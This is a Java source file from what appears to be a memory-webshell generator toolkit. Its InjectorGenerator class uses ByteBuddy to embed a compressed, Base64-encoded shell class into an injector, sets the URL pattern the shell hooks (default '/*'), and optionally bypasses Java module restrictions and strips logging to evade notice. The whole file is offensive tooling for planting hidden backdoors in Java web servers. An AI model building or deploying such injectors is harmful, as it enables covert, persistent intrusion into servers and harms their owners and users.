package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.ByPassJavaModuleInterceptor;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.codec.binary.Base64;

import java.util.Objects;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class InjectorGenerator {
    private final ShellConfig shellConfig;
    private final InjectorConfig injectorConfig;

    public InjectorGenerator(ShellConfig shellConfig, InjectorConfig injectorConfig) {
        this.shellConfig = shellConfig;
        this.injectorConfig = injectorConfig;
    }

    @SneakyThrows
    public DynamicType.Builder<?> getBuilder() {
        String base64String = Base64.encodeBase64String(CommonUtil.gzipCompress(injectorConfig.getShellClassBytes()));
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(injectorConfig.getInjectorClass())
                .name(injectorConfig.getInjectorClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(injectorConfig.getUrlPattern(), "/*")))
                .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));

        if (shellConfig.needByPassJavaModule()) {
            builder = ByPassJavaModuleInterceptor.extend(builder);
        }

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }
        return builder;
    }

    @SneakyThrows
    public byte[] generate() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}